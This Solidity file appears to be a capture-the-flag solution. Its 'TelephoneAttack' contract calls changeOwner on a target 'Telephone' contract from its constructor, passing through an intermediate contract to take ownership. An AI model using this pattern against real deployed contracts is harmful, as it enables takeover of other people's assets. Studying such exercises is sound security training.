// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract TelephoneAttack {

    constructor (address _target) {
        Telephone(_target).changeOwner(msg.sender);
    }
}